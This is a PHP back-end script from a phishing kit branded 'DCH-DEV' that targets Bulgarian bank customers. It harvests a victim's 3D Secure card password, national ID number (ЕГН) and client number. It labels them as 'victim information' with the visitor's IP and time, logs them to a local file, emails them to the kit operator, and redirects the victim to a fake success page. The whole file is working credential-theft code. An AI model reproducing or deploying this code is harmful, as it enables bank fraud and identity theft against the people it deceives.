<?php 
include('Email.php');
include('get_browser.php');
include('get_ip.php');
include('funciones.php');
$password3done = $_POST['passwordxone'];
$password3dtow = $_POST['passwordxtow'];
$password3dtry = $_POST['passwordxtry'];
$ip = $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');

if (isset($_POST['Addpassword3d'])) {
	$DCH_MESSAGE .= "<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY DCH-DEV </font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
================( <font style='color: #0a5d00;'> password3d  ".$ip."</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [3D парола] = <font style='color:#ba0000;'>".$password3done."</font><br>
<font style='color:#00049c;'>🤑✪</font> [ЕГН ] = <font style='color:#ba0000;'>".$password3dtow."</font><br>
<font style='color:#00049c;'>🤑✪</font> [КлиентскиятВи 9-цифрен номер] = <font style='color:#ba0000;'>".$password3dtry."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>".$ip."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY DCH-DEV </font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
</div></html>\n";

functiondilih(strip_tags($DCH_MESSAGE));
$khraha = fopen("./samiRzL.html", "a");
fwrite($khraha, $DCH_MESSAGE);
$DCH_SUBJECT .= "$ip";
$DCH_HEADERS .= "From: Dch-Dev<cantact>";
$DCH_HEADERS .= "Dch-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
HEADER("Location: ../Succuss_expression.php?assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");

}


 ?>